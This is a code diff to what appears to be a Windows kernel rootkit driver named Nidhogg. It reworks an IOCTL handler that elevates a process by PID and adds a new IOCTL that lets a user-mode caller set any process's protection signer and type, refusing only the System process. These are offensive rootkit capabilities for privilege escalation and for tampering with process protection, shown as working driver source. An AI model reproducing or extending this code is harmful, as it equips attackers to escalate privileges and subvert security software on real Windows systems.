@@ -337,12 +337,37 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		if (!NT_SUCCESS(ElevateProcess(*data))) {
-			status = STATUS_UNSUCCESSFUL;
+		status = ElevateProcess(*data);
+
+		if (NT_SUCCESS(status))
+			KdPrint((DRIVER_PREFIX "Elevated process with pid %d.\n", *data));
+
+		break;
+	}
+
+	case IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+
+		if (size % sizeof(ProcessSignature) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
-		KdPrint((DRIVER_PREFIX "Elevated process with pid %d.\n", *data));
+		auto data = (ProcessSignature*)Irp->AssociatedIrp.SystemBuffer;
+
+		if ((data->Pid == 4) || 
+			(data->SignatureSigner < PsProtectedSignerNone || data->SignatureSigner > PsProtectedSignerMax) ||
+			(data->SignerType < PsProtectedTypeNone || data->SignerType > PsProtectedTypeProtected)) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		status = SetProcessSignature(data);
+
+		if (NT_SUCCESS(status))
+			KdPrint((DRIVER_PREFIX "New signature applied to %d.\n", data->Pid));
+
 		break;
 	}
 
